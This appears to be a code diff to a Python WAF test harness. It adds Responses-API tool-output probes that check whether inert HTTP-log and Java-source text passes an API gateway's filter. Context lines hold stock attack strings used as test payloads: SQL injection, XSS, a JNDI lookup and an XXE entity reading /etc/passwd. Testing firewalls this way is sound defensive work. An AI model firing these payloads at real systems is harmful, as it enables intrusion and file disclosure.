@@ -81,6 +81,8 @@ ROOT = Path(__file__).resolve().parents[1]
 INVALID_MODEL = "__waf_probe_invalid_model__"
 CONTROL_SQL = "1 OR 1=1 UNION SELECT NULL,NULL-- synthetic-waf-probe"
 CONTROL_REFERER_XSS = "https://example.invalid/?q=<script>alert('synthetic-waf-control')</script>"
+HTTP_LOG_TEXT = "Synthetic HTTP access log:\r\nGET /synthetic HTTP/1.1\r\nHost: example.invalid\r\n\r\n"
+JAVA_SOURCE_TEXT = "Review inert Java source: java.lang.Runtime.getRuntime();"
 CANARY_ROUTES = frozenset({
     ("POST", "/models/openai/v1/chat/completions"),
     ("POST", "/models/openai/v1/responses"),
@@ -648,6 +650,8 @@ def adversarial_content(routes: list[Route]) -> list[Probe]:
         ("literal-xss", "<img src=x onerror=alert(1)>"),
         ("literal-jndi", "${jndi:ldap://waf-probe.invalid/synthetic}"),
         ("literal-xxe", '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'),
+        ("literal-http-log", HTTP_LOG_TEXT),
+        ("literal-java", JAVA_SOURCE_TEXT),
     )
     cases = []
     for route in routes:
@@ -1135,6 +1139,56 @@ def _native_history_variants(base: dict, text: str) -> list[tuple[str, str, dict
             history({**patch, "operation": {**patch["operation"],
                 "type": operation, "diff": patch_text}}, patch_output)))
     return variants
+
+
+def responses_tool_output_probes(routes: list[Route]) -> list[Probe]:
+    """Keep HTTP request logs and Java source regressions at one native leaf.
+
+    Source text is inert JSON data, never an HTTP request or executed Java.
+    Same-name query arguments require the APIM query guard; sibling/model/id
+    controls retain WAF inspection. The independent header control uses the
+    CRS-targeted Referer XSS signature rather than an arbitrary source header.
+    """
+    candidates = [route for route in routes if (route.target, route.method, route.path)
+                  == ("gateway", "POST", "/models/openai/v1/responses")]
+    if len(candidates) != 1:
+        raise ValueError("tool-output probes require exactly the published Responses POST contract")
+    route = candidates[0]
+    values = (
+        ("http-request-line", HTTP_LOG_TEXT),
+        ("java-source", JAVA_SOURCE_TEXT),
+    )
+
+    def envelope(text):
+        return {"model": INVALID_MODEL, "store": False, "max_output_tokens": 1, "input": [
+            {"role": "user", "content": "Review this synthetic tool result."},
+            {"type": "function_call", "call_id": "call_waf_output", "name": "synthetic_probe", "arguments": "{}"},
+            {"type": "function_call_output", "call_id": "call_waf_output", "output": [{"type": "input_text", "text": text}]},
+            {"role": "user", "content": "Continue the review."}]}
+
+    cases = []
+    def add(label, field_name, value, *, intent="compatibility", query=(), path=None, headers=()):
+        cases.append(_probe(replace(route, path=path) if path else route,
+            "responses-tool-output-" + label, "responses-tool-output-" + label,
+            body=json_bytes(value), headers=[("Content-Type", "application/json"), *headers],
+            query=query, payload_field=field_name, intent=intent))
+
+    for label, text in values:
+        add(label, "input[].output[].text", envelope(text))
+        baseline = envelope("Synthetic tool result")
+        sibling = envelope("Synthetic tool result")
+        sibling["input"][2]["output"][0]["text_extra"] = text
+        add(label + "-sibling", "input[].output[].text_extra", sibling, intent="attack_control")
+        add(label + "-unknown", "_attack", {**baseline, "_attack": text}, intent="attack_control")
+        add(label + "-model", "model", {**baseline, "model": text}, intent="attack_control")
+        add(label + "-query-id", "query:id", baseline, query=[("id", text)], intent="attack_control")
+        add(label + "-query-collision", "query:input.output.text", baseline,
+            query=[("input.output.text", text)], intent="validation")
+        add(label + "-neighbor", "input[].output[].text", envelope(text),
+            path=route.path + "/neighbor", intent="attack_control")
+    add("header", "header:Referer", envelope("Synthetic tool result"),
+        headers=[("Referer", CONTROL_REFERER_XSS)], intent="attack_control")
+    return cases
 
 
 def ai_coding_probes(routes: list[Route]) -> list[Probe]:
@@ -2103,6 +2157,7 @@ def required_corpus(routes: list[Route] | None = None, *, exhaustive: bool = Fal
     routes = load_routes(root) if routes is None else routes
     corpus = build_corpus(routes, root=root)
     corpus += ai_coding_probes(routes) + jndi_field_probes(routes) + image_prompt_probes(routes) + raw_body_guard_controls(routes)
+    corpus += responses_tool_output_probes(routes)
     if exhaustive:
         corpus += wire_shape_probes(routes, exhaustive=True, root=root)
     unique = {case.case_id: case for case in corpus}
@@ -2114,7 +2169,7 @@ def required_corpus(routes: list[Route] | None = None, *, exhaustive: bool = Fal
             continue
         if case.expected_boundary == "observation":
             continue
-        if case.category == "baseline" or case.category.startswith("wire-"):
+        if case.category == "baseline" or case.category.startswith(("wire-", "responses-tool-output-")):
             selected.append(case)
             continue
         # Keep suites covering explicit fields/types, mandatory query guards
@@ -2133,7 +2188,7 @@ def required_corpus(routes: list[Route] | None = None, *, exhaustive: bool = Fal
 def incident_corpus(routes: list[Route] | None = None, root: Path = ROOT) -> list[Probe]:
     """Short anonymous incident gate; full model acceptance stays a separate plan."""
     routes = load_routes(root) if routes is None else routes
-    cases = wire_shape_probes(routes, root=root)
+    cases = wire_shape_probes(routes, root=root) + responses_tool_output_probes(routes)
     # Each WAF profile/raw MIME/Portal handler has a representative boundary;
     # this fast subset does not claim selector or published-model completeness.
     covered = set()
